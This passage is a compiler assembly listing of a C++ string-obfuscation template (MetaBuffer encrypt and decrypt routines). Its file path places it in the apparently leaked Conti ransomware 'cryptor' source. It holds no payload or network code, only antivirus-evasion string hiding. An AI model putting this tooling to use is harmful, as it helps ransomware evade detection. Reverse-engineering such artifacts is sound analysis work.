  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 18	 cmp	 QWORD PTR i$1[rbp], 24
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@AEBAEE@Z ; MetaBuffer<61,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<61,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@QEBA_NXZ PROC ; MetaBuffer<61,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<61,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv266 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<61,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::MetaBuffer<61,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@AEBAEE@Z ; MetaBuffer<61,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@AEBAEE@Z ; MetaBuffer<61,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@AEBAEE@Z ; MetaBuffer<61,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@AEBAEE@Z ; MetaBuffer<61,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@AEBAEE@Z ; MetaBuffer<61,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@AEBAEE@Z ; MetaBuffer<61,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@AEBAEE@Z ; MetaBuffer<61,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@AEBAEE@Z ; MetaBuffer<61,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	b8 01 00 00 00	 mov	 eax, 1
  00183	48 6b c0 08	 imul	 rax, rax, 8
  00187	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0018e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00192	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00199	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@AEBAEE@Z ; MetaBuffer<61,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::encrypt
  0019e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001a5	88 41 09	 mov	 BYTE PTR [rcx+9], al
  001a8	b8 01 00 00 00	 mov	 eax, 1
  001ad	48 6b c0 09	 imul	 rax, rax, 9
  001b1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001b8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001c3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@AEBAEE@Z ; MetaBuffer<61,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::encrypt
  001c8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001cf	88 41 0a	 mov	 BYTE PTR [rcx+10], al
  001d2	b8 01 00 00 00	 mov	 eax, 1
  001d7	48 6b c0 0a	 imul	 rax, rax, 10
  001db	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001e2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001ed	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@AEBAEE@Z ; MetaBuffer<61,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::encrypt
  001f2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001f9	88 41 0b	 mov	 BYTE PTR [rcx+11], al
  001fc	b8 01 00 00 00	 mov	 eax, 1
  00201	48 6b c0 0b	 imul	 rax, rax, 11
  00205	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0020c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00210	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00217	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@AEBAEE@Z ; MetaBuffer<61,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::encrypt
  0021c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00223	88 41 0c	 mov	 BYTE PTR [rcx+12], al
  00226	b8 01 00 00 00	 mov	 eax, 1
  0022b	48 6b c0 0c	 imul	 rax, rax, 12
  0022f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00236	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0023a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00241	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@AEBAEE@Z ; MetaBuffer<61,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::encrypt
  00246	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0024d	88 41 0d	 mov	 BYTE PTR [rcx+13], al
  00250	b8 01 00 00 00	 mov	 eax, 1
  00255	48 6b c0 0d	 imul	 rax, rax, 13
  00259	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00260	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00264	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0026b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@AEBAEE@Z ; MetaBuffer<61,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::encrypt
  00270	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00277	88 41 0e	 mov	 BYTE PTR [rcx+14], al
  0027a	b8 01 00 00 00	 mov	 eax, 1
  0027f	48 6b c0 0e	 imul	 rax, rax, 14
  00283	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0028a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0028e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00295	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@AEBAEE@Z ; MetaBuffer<61,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::encrypt
  0029a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002a1	88 41 0f	 mov	 BYTE PTR [rcx+15], al
  002a4	b8 01 00 00 00	 mov	 eax, 1
  002a9	48 6b c0 0f	 imul	 rax, rax, 15
  002ad	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  002b4	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  002b8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002bf	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@AEBAEE@Z ; MetaBuffer<61,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::encrypt
  002c4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002cb	88 41 10	 mov	 BYTE PTR [rcx+16], al
  002ce	b8 01 00 00 00	 mov	 eax, 1
  002d3	48 6b c0 10	 imul	 rax, rax, 16
  002d7	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  002de	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  002e2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002e9	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@AEBAEE@Z ; MetaBuffer<61,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::encrypt
  002ee	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002f5	88 41 11	 mov	 BYTE PTR [rcx+17], al
  002f8	b8 01 00 00 00	 mov	 eax, 1
  002fd	48 6b c0 11	 imul	 rax, rax, 17
  00301	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00308	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0030c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00313	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@AEBAEE@Z ; MetaBuffer<61,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::encrypt
  00318	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0031f	88 41 12	 mov	 BYTE PTR [rcx+18], al
  00322	b8 01 00 00 00	 mov	 eax, 1
  00327	48 6b c0 12	 imul	 rax, rax, 18
  0032b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00332	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00336	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0033d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@AEBAEE@Z ; MetaBuffer<61,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::encrypt
  00342	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00349	88 41 13	 mov	 BYTE PTR [rcx+19], al
  0034c	b8 01 00 00 00	 mov	 eax, 1
  00351	48 6b c0 13	 imul	 rax, rax, 19
  00355	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0035c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00360	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00367	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@AEBAEE@Z ; MetaBuffer<61,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::encrypt
  0036c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00373	88 41 14	 mov	 BYTE PTR [rcx+20], al
  00376	b8 01 00 00 00	 mov	 eax, 1
  0037b	48 6b c0 14	 imul	 rax, rax, 20
  0037f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00386	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0038a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00391	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@AEBAEE@Z ; MetaBuffer<61,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::encrypt
  00396	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0039d	88 41 15	 mov	 BYTE PTR [rcx+21], al
  003a0	b8 01 00 00 00	 mov	 eax, 1
  003a5	48 6b c0 15	 imul	 rax, rax, 21
  003a9	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  003b0	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  003b4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
